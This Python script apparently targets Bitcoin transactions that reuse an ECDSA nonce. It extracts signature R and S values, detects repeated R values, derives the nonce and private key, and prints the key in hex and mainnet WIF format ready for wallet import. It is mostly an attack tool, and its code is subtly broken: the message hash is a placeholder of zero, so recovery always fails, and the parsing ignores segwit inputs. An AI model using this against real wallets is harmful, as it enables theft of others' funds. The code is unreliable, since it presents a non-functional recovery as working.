#!/usr/bin/env python3
"""
Bitcoin ECDSA Nonce Reuse Private Key Recovery
Analyzes Bitcoin transactions to detect nonce reuse and recover private keys
"""

import hashlib
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass

# secp256k1 curve order
CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


@dataclass
class ECDSASignature:
    """Represents an ECDSA signature from a Bitcoin transaction"""
    r: int
    s: int
    message_hash: int
    input_index: int
    der_signature: bytes


def parse_varint(data: bytes, offset: int) -> Tuple[int, int]:
    """Parse Bitcoin variable-length integer"""
    first_byte = data[offset]

    if first_byte < 0xfd:
        return first_byte, offset + 1
    elif first_byte == 0xfd:
        return int.from_bytes(data[offset+1:offset+3], 'little'), offset + 3
    elif first_byte == 0xfe:
        return int.from_bytes(data[offset+1:offset+5], 'little'), offset + 5
    else:  # 0xff
        return int.from_bytes(data[offset+1:offset+9], 'little'), offset + 9


def parse_script(data: bytes, offset: int) -> Tuple[bytes, int]:
    """Parse Bitcoin script"""
    script_len, new_offset = parse_varint(data, offset)
    script = data[new_offset:new_offset + script_len]
    return script, new_offset + script_len


def parse_der_signature(der_sig: bytes) -> Tuple[int, int]:
    """
    Parse DER-encoded ECDSA signature to extract r and s values
    DER format: 0x30 [total-length] 0x02 [R-length] [R] 0x02 [S-length] [S]
    """
    if len(der_sig) < 8 or der_sig[0] != 0x30:
        raise ValueError("Invalid DER signature format")

    # Parse R value
    r_offset = 4
    r_length = der_sig[3]
    r = int.from_bytes(der_sig[r_offset:r_offset + r_length], 'big')

    # Parse S value
    s_offset = r_offset + r_length + 2
    s_length = der_sig[s_offset - 1]
    s = int.from_bytes(der_sig[s_offset:s_offset + s_length], 'big')

    return r, s


def extract_signatures_from_raw_tx(raw_tx_hex: str) -> List[ECDSASignature]:
    """Extract all ECDSA signatures from a raw Bitcoin transaction"""
    raw_tx = bytes.fromhex(raw_tx_hex)
    signatures = []

    offset = 0

    # Parse version (4 bytes)
    version = int.from_bytes(raw_tx[offset:offset+4], 'little')
    offset += 4

    print(f"Transaction version: {version}")

    # Parse input count
    input_count, offset = parse_varint(raw_tx, offset)
    print(f"Number of inputs: {input_count}")

    # Parse each input
    for input_idx in range(input_count):
        # Previous transaction hash (32 bytes)
        prev_tx_hash = raw_tx[offset:offset+32]
        offset += 32

        # Previous output index (4 bytes)
        prev_out_idx = int.from_bytes(raw_tx[offset:offset+4], 'little')
        offset += 4

        # Script signature
        script_sig, offset = parse_script(raw_tx, offset)

        # Sequence (4 bytes)
        sequence = int.from_bytes(raw_tx[offset:offset+4], 'little')
        offset += 4

        # Extract signature from script
        try:
            # Most Bitcoin transactions have the signature in the scriptSig
            # Format is typically: [sig_length] [signature] [sighash_type] [pubkey_length] [pubkey]

            sig_offset = 0
            if sig_offset < len(script_sig):
                sig_length = script_sig[sig_offset]
                sig_offset += 1

                if sig_offset + sig_length <= len(script_sig):
                    # Extract DER signature (excluding sighash type byte at the end)
                    der_sig = script_sig[sig_offset:sig_offset + sig_length - 1]

                    try:
                        r, s = parse_der_signature(der_sig)

                        # For now, we'll use a placeholder for message hash
                        # In a real scenario, this would be computed from the transaction data
                        message_hash = 0  # This needs to be computed properly

                        sig = ECDSASignature(
                            r=r,
                            s=s,
                            message_hash=message_hash,
                            input_index=input_idx,
                            der_signature=der_sig
                        )
                        signatures.append(sig)

                        print(f"Input {input_idx}:")
                        print(f"  R: {hex(r)}")
                        print(f"  S: {hex(s)}")

                    except Exception as e:
                        print(f"Error parsing signature for input {input_idx}: {e}")
        except Exception as e:
            print(f"Error extracting signature from input {input_idx}: {e}")

    return signatures


def find_nonce_reuse(signatures: List[ECDSASignature]) -> Dict[int, List[ECDSASignature]]:
    """Group signatures by R value to find nonce reuse"""
    r_groups: Dict[int, List[ECDSASignature]] = {}

    for sig in signatures:
        if sig.r not in r_groups:
            r_groups[sig.r] = []
        r_groups[sig.r].append(sig)

    # Filter to only reused R values
    reused = {r: sigs for r, sigs in r_groups.items() if len(sigs) > 1}

    return reused


def mod_inverse(a: int, m: int) -> int:
    """Calculate modular multiplicative inverse using extended Euclidean algorithm"""
    if a < 0:
        a = (a % m + m) % m

    g, x, _ = extended_gcd(a, m)
    if g != 1:
        raise ValueError("Modular inverse does not exist")
    return x % m


def extended_gcd(a: int, b: int) -> Tuple[int, int, int]:
    """Extended Euclidean Algorithm"""
    if a == 0:
        return b, 0, 1

    gcd, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1

    return gcd, x, y


def recover_private_key(sig1: ECDSASignature, sig2: ECDSASignature) -> Optional[int]:
    """
    Recover private key from two signatures with the same nonce (k)

    Algorithm:
    1. k = (m1 - m2) / (s1 - s2) mod n
    2. d = (s1 * k - m1) / r mod n

    Where:
    - k is the nonce
    - d is the private key
    - m1, m2 are message hashes
    - r, s are signature components
    - n is the curve order
    """

    if sig1.r != sig2.r:
        print("Error: Signatures must have the same R value")
        return None

    r = sig1.r
    s1 = sig1.s
    s2 = sig2.s
    m1 = sig1.message_hash
    m2 = sig2.message_hash

    print(f"\nAttempting private key recovery:")
    print(f"  R (shared): {hex(r)}")
    print(f"  S1: {hex(s1)}")
    print(f"  S2: {hex(s2)}")
    print(f"  M1: {hex(m1)}")
    print(f"  M2: {hex(m2)}")

    # Step 1: Recover nonce k
    try:
        numerator = (m1 - m2) % CURVE_ORDER
        denominator = (s1 - s2) % CURVE_ORDER

        if denominator == 0:
            print("Error: s1 - s2 = 0, cannot recover key")
            return None

        denominator_inv = mod_inverse(denominator, CURVE_ORDER)
        k = (numerator * denominator_inv) % CURVE_ORDER

        print(f"  Recovered nonce k: {hex(k)}")

        # Step 2: Recover private key d
        numerator2 = (s1 * k - m1) % CURVE_ORDER
        r_inv = mod_inverse(r, CURVE_ORDER)
        private_key = (numerator2 * r_inv) % CURVE_ORDER

        print(f"  Recovered private key: {hex(private_key)}")

        if private_key == 0:
            print("Error: Recovered private key is zero")
            return None

        return private_key

    except Exception as e:
        print(f"Error recovering private key: {e}")
        return None


def private_key_to_wif(private_key: int, compressed: bool = True) -> str:
    """Convert private key to Wallet Import Format (WIF)"""
    # Mainnet prefix
    prefix = b'\x80'

    # Convert private key to bytes (32 bytes)
    key_bytes = private_key.to_bytes(32, 'big')

    # Add compression flag if needed
    if compressed:
        extended_key = prefix + key_bytes + b'\x01'
    else:
        extended_key = prefix + key_bytes

    # Double SHA256 checksum
    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]

    # Combine and encode in base58
    wif_bytes = extended_key + checksum

    return base58_encode(wif_bytes)


def base58_encode(data: bytes) -> str:
    """Encode bytes to Base58"""
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

    # Convert bytes to integer
    num = int.from_bytes(data, 'big')

    # Encode
    encoded = ''
    while num > 0:
        num, remainder = divmod(num, 58)
        encoded = alphabet[remainder] + encoded

    # Add '1' for each leading zero byte
    for byte in data:
        if byte == 0:
            encoded = '1' + encoded
        else:
            break

    return encoded


def analyze_transaction(raw_tx_hex: str):
    """Main analysis function"""
    print("="*80)
    print("Bitcoin ECDSA Nonce Reuse Private Key Recovery")
    print("="*80)
    print()

    # Extract signatures
    print("Step 1: Extracting signatures from transaction...")
    signatures = extract_signatures_from_raw_tx(raw_tx_hex)
    print(f"\nFound {len(signatures)} signatures")
    print()

    # Find nonce reuse
    print("Step 2: Detecting nonce reuse (same R values)...")
    reused_r = find_nonce_reuse(signatures)

    if not reused_r:
        print("No nonce reuse detected. Transaction appears secure.")
        return

    print(f"\n⚠️  VULNERABILITY DETECTED!")
    print(f"Found {len(reused_r)} R value(s) that were reused:")
    print()

    for r_value, sigs in reused_r.items():
        print(f"R value {hex(r_value)} used in {len(sigs)} signatures:")
        for sig in sigs:
            print(f"  - Input index: {sig.input_index}")
    print()

    # Attempt private key recovery
    print("Step 3: Attempting private key recovery...")
    print()

    for r_value, sigs in reused_r.items():
        if len(sigs) >= 2:
            print(f"Processing R value: {hex(r_value)}")

            # Try first pair
            private_key = recover_private_key(sigs[0], sigs[1])

            if private_key:
                print()
                print("="*80)
                print("✓ PRIVATE KEY SUCCESSFULLY RECOVERED!")
                print("="*80)
                print(f"Private Key (decimal): {private_key}")
                print(f"Private Key (hex):     {hex(private_key)}")
                print()

                # Generate WIF formats
                try:
                    wif_compressed = private_key_to_wif(private_key, compressed=True)
                    wif_uncompressed = private_key_to_wif(private_key, compressed=False)

                    print(f"WIF (compressed):      {wif_compressed}")
                    print(f"WIF (uncompressed):    {wif_uncompressed}")
                except Exception as e:
                    print(f"Error generating WIF: {e}")

                print("="*80)
                return private_key

    print("Could not recover private key from the detected nonce reuse.")
    return None


if __name__ == "__main__":
    # The raw transaction provided by the user
    RAW_TX = ""

    analyze_transaction(RAW_TX)
